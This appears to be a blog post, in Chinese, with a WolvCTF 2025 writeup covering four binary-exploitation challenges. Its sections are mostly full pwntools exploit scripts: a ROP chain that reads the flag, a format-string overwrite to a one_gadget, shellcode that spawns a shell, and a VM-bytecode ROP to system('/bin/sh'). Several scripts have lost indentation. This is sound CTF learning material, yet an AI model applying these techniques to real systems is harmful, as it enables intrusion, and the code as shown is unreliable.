@@ -1,0 +1,366 @@
+export const layout = "#components/Page.js";
+export const title = "WolvCTF 2025 Writeup";
+export const description = "2025年 WolvCTF 题解";
+export const created = "2025-03-26";
+
+# WolvCTF 2025 Writeup
+
+## DryWall
+
+orw，注意一下 `openat` 的第一个参数，如果使用绝对路径的话应该是 `AT_FOWD`，也就是 `-100`，对应 `0xffffff9c`
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./chal"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("drywall.kctf-453514-codelab.kctf.cloud", 1337) if argv[1] == 'r' else process(proc)
+
+if args.G:
+gdb.attach(io, "breakrva 0x137a")
+
+io.sendlineafter(b"?\n", b"./flag.txt\x00")
+io.recvuntil(b"<|;)\n")
+main_addr = int(io.recvuntil(b"\n", drop=True).decode(), 16)
+
+pie = main_addr - elf.sym['main']
+log.info(f"pie => {hex(pie)}")
+
+flag_addr = pie + 0x4050
+pop_rax_ret = pie + 0x000000000000119b
+pop_rdi_ret = pie + 0x00000000000013db
+pop_rsi_ret = pie + 0x00000000000013d9
+pop_rdx_ret = pie + 0x0000000000001199
+syscall = pie + 0x000000000000119d
+
+payload = b"a" * 280
+payload += flat([pop_rdi_ret, 0xffffff9c, pop_rsi_ret, flag_addr, 0, pop_rax_ret, 257, pop_rdx_ret, 4, syscall])
+payload += flat([pop_rdi_ret, 3, pop_rsi_ret, pie + 0x4060, 0, pop_rdx_ret, 0x30, pop_rax_ret, 0, syscall])
+# payload += flat([pop_rdi_ret, 3, pop_rsi_ret, pie + 0x4060, 0, pop_rdx_ret, 0x100, pop_rax_ret, 78, syscall])
+payload += flat([pop_rdi_ret, 1, pop_rsi_ret, pie + 0x4060, 0, pop_rdx_ret, 0x100, pop_rax_ret, 1, syscall])
+io.sendline(payload)
+io.interactive()
+```
+
+
+## TakeNote
+
+格式化字符串，不完全是堆上的格式化字符串，因为题目先用一个栈变量存了输入的格式化字符串，再加上程序栈上找不出来两条链子，所以就还是用栈上的格式化字符串打法打。
+
+这里没用 pwntools 生成，毕竟还是有长度限制的，自己手写方便点。
+
+one_gadget 挑的是这个，因为注意到 `r15` 和 `rdx` 寄存器刚好是 0：
+
+```
+0xe3b01 execve("/bin/sh", r15, rdx)
+constraints:
+[r15] == NULL || r15 == NULL || r15 is a valid argv
+[rdx] == NULL || rdx == NULL || rdx is a valid envp
+```
+
+布置栈链的时候显然得 4 字节 4 字节写入，于是得爆破一下，1/16
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./chal_patched"
+context.log_level = "info"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+
+if args.G:
+    gdb.attach(io, "breakrva 0x14d8")
+
+
+def choose(op):
+    io.sendlineafter(b"Exit\n\n", str(op).encode())
+
+
+def write(idx, content):
+    choose(1)
+    io.sendlineafter(b"]\n", str(idx).encode())
+    io.sendline(content)
+
+
+def show(idx):
+    choose(2)
+    io.sendlineafter(b"?\n\n", str(idx).encode())
+
+
+def pwn():
+    io.sendlineafter(b"e?\n\n", str(16).encode())
+    write(0, b"%p.%14$p,%15$p")
+    show(0)
+    io.recvuntil(b"reads:\n\n")
+    libc_base = int(io.recvuntil(b".", drop=True).decode(), 16) - 0x1ed723
+    pie = int(io.recvuntil(b",", drop=True).decode(), 16) - 0x15b0
+    stack_addr = int(io.recvuntil(b"\n", drop=True).decode(), 16) - 0x18
+    log.info(f"libc_base => {hex(libc_base)}\npie => {hex(pie)}\nstack_addr => {hex(stack_addr)}")
+
+    system = libc_base + libc.sym['system']
+    pop_rdi_ret = pie + 0x000000000000160b
+    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
+    ogg = libc_base + 0xe3b01
+    log.info(f"ogg => {hex(ogg)}")
+
+    write(1, f"%30576c%14$hnaaa".encode() + p64(stack_addr))
+    show(1)
+    write(2, f"%{ogg & 0xffff}c%19$hn".ljust(16, "a").encode())
+    show(2)
+
+    write(3, b"%30578c%14$hnaaa" + p64(stack_addr))
+    show(3)
+    write(4, f"%{(ogg >> 16) & 0xffff}c%19$hn".ljust(16, "a").encode())
+    show(4)
+
+    write(5, b"%30580c%14$hnaaa" + p64(stack_addr))
+    show(5)
+    write(6, f"%{(ogg >> 32) & 0xff}c%19$hhn".ljust(16, "a").encode())
+    show(6)
+
+    write(7, b"%30581c%14$hnaaa" + p64(stack_addr))
+    show(7)
+    write(8, f"%{(ogg >> 40)}c%19$hhn".ljust(16, "a").encode())
+    show(8)
+
+    choose(3)
+
+
+while True:
+    io = remote("takenote.kctf-453514-codelab.kctf.cloud", 1337) if argv[1] == 'r' else process(proc)
+    try:
+        pwn()
+        io.interactive()
+    except:
+```
+
+
+## LabGrown
+
+shellcode 题，核心就是 shellcode 构造，这里主要是赛后和出题人交流了一下，出题人给了一个 fuzz trick（我赛时就是完全手搓试出来的）
+
+> At a high level you have a few target operations,  say if you want to setup `execve(/bin/sh)` you need to get rdi set with the right value, rax to 0x3b, and make sure rsi & rdx are 0. This challenge made linking operations difficult with its xor and even/odd constraints, but it wasn't too hard to find valid instructions in isolation that did what you wanted, like in my case a gadget like `mov al, 0x3b`, and we weren't super length constrained, so to link gadgets I just iterated through all possible sequences of 1,2, or 3 bytes between gadgets, checking first if they would allow our payload to met the jail constraints, then disassembling them along with the payload to see if the instruction was valid x86 and a 'no-op' with respect to the constraints I needed for the syscall, then actually running it to see if it didn't break.
+
+以上是出题人的原话，但是 t1d 说 fuzz 没啥用（
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./chal_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("labgrown.kctf-453514-codelab.kctf.cloud", 1337) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, "b *0x40142b")
+
+
+def gen(s):
+    res = asm(s)
+    for i in range(len(res)):
+        print(res[i], end=", ")
+    for i in range(len(res)-1):
+        if (res[i] ^ res[i+1]) & 1 == 0:
+        print(f"idx: {i}, {res[i]}, {res[i+1]}\n")
+
+
+read = asm("""
+push r14
+gs
+inc ax
+push r14
+gs
+inc ax
+push rdi
+pop rsi
+std
+nop
+mov edx, ecx
+pop rdi
+pop rax
+""")
+io.sendline(read)
+
+io.sendline(b"\x90" * 0x20 + asm(shellcraft.sh()))
+io.interactive()
+```
+
+## VC1K
+
+vm pwn，栈上任意地址写，和 HFCTF2022 Pwn avm 比较像，不需要泄漏 libc，可以把 `pop_rdi_ret` `binsh` `system` 都在栈上算好。
+
+偏移可以直接输进去，用功能三的那个条件跳转跳过去。
+
+```python
+#!/bin/python3
+from pwn import *
+
+context.log_level = 'INFO'
+context.terminal = ['remotinator', 'vsplit', '-x']
+context.arch = 'amd64'
+
+
+process_name = './chal_patched'
+elf = context.binary = ELF(process_name)
+libc = ELF('./libc.so.6')
+
+HOST = "vc1k.kctf-453514-codelab.kctf.cloud"
+PORT = 1337
+
+######################################################################################
+
+# breakrva [-h] [offset] [module]
+# aslr [-h] [{off,on}]
+gdb_script = f'''
+#set breakpoint pending on
+#breakrva 0x1277
+#breakrva 0x14a4
+#breakrva 0x13a7
+#b *run+368
+b *run+786
+continue
+'''
+
+######################################################################################
+
+def connect():
+if args.REMOTE:
+print(f"[*] Connecting to {HOST} : {PORT}")
+p = remote(HOST, PORT, ssl=False)
+elif args.GDB:
+print(f'[*] Debugging {elf.path}.')
+p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
+else:
+print(f'[*] Executing {elf.path}.')
+p = process([elf.path])
+return p
+
+def opcode_add(op1Idx, op2Idx):
+opcode = (0 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7)
+return p16(opcode)
+
+def opcode_nand(op1Idx, op2Idx):
+opcode = (1 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7)
+return p16(opcode)
+
+def opcode_jmp_eq(op1Idx, op2Idx, jmp):
+opcode = (2 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7) | ((jmp & 0x7F) << 6)
+return p16(opcode)
+
+def opcode_halt():
+opcode = (3 << 13)
+return p16(opcode)
+
+def opcode_load(op1Idx, op2Idx, jmp):
+opcode = (4 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7) | ((jmp & 0x7F) << 6)
+return p16(opcode)
+
+def opcode_load_alt(op1Idx, op2Idx, jmp):
+opcode = (5 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7) | ((jmp & 0x7F) << 6)
+return p16(opcode)
+
+def opcode_store(op1Idx, op2Idx, jmp):
+opcode = (6 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7) | ((jmp & 0x7F) << 6)
+return p16(opcode)
+
+def opcode_store_alt(op1Idx, op2Idx, jmp):
+opcode = (7 << 13) | ((op1Idx & 0x7) << 3) | (op2Idx & 0x7) | ((jmp & 0x7F) << 6)
+return p16(opcode)
+
+######################################################################################
+
+p = connect()
+
+payload  = opcode_jmp_eq(1, 1, 0x7f)
+
+# Registros
+payload += p16(0x7FFF)
+payload += p16(0x7ffff7df91ab - 0x7ffff7df9083) # Ret offset
+payload += p16(0xfae7)                          # Pop rdi lo
+payload += p16(0x95bd - 0x9083)                 # Binsh lo
+payload += p16(0xf7f8 - 0xf7df)                 # Binsh mid
+payload += p16(0xe20d)                          # System lo
+payload += p16(0xf7e2 - 0xf7df)                 # System mid
+
+# Padding
+payload += b'\x00' * (0xfe - len(payload))
+
+# Opcodes
+payload += opcode_load_alt(0, 1, 1)             # Cargo 0x7fff en el reg[0]
+
+payload += opcode_load_alt(1, 0, 0x58//2)
+payload += opcode_store_alt(1, 0, 0x38//2)
+payload += opcode_store_alt(1, 0, 0x40//2)
+payload += opcode_store_alt(1, 0, 0x48//2)
+payload += opcode_store_alt(1, 0, 0x50//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+2)//2)
+payload += opcode_store_alt(1, 0, (0x38+2)//2)
+payload += opcode_store_alt(1, 0, (0x40+2)//2)
+payload += opcode_store_alt(1, 0, (0x48+2)//2)
+payload += opcode_store_alt(1, 0, (0x50+2)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+4)//2)
+payload += opcode_store_alt(1, 0, (0x38+4)//2)
+payload += opcode_store_alt(1, 0, (0x40+4)//2)
+payload += opcode_store_alt(1, 0, (0x48+4)//2)
+payload += opcode_store_alt(1, 0, (0x50+4)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+6)//2)
+payload += opcode_store_alt(1, 0, (0x38+6)//2)
+payload += opcode_store_alt(1, 0, (0x40+6)//2)
+payload += opcode_store_alt(1, 0, (0x48+6)//2)
+payload += opcode_store_alt(1, 0, (0x50+6)//2)
+
+payload += opcode_load_alt(1, 0, 0x58//2)           # RET
+payload += opcode_load_alt(3, 2, 2)
+payload += opcode_add(1, 3)
+payload += opcode_store_alt(1, 0, (0x38+0)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+0)//2)      # Pop Rdi lo
+payload += opcode_load_alt(3, 2, 3)
+payload += opcode_add(1, 3)
+payload += opcode_store_alt(1, 0, (0x40+0)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+0)//2)      # /bin/sh lo
+payload += opcode_load_alt(3, 2, 4)
+payload += opcode_add(1, 3)
+payload += opcode_store_alt(1, 0, (0x48+0)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+2)//2)      # /bin/sh mid
+payload += opcode_load_alt(3, 2, 5)
+payload += opcode_add(1, 3)
+payload += opcode_store_alt(1, 0, (0x48+2)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+0)//2)      # System lo
+payload += opcode_load_alt(3, 2, 6)
+payload += opcode_add(1, 3)
+payload += opcode_store_alt(1, 0, (0x50+0)//2)
+
+payload += opcode_load_alt(1, 0,  (0x58+2)//2)      # System mid
+payload += opcode_load_alt(3, 2, 7)
+payload += opcode_add(1, 3)
+payload += opcode_store_alt(1, 0, (0x50+2)//2)
+
+
+# End
+payload += opcode_halt()
+
+
+# Run
+assert ((len(payload) // 2) < 0x8000)
+p.send(p16(len(payload) // 2) + payload)
+
+######################################################################################
+
+p.interactive()
+```
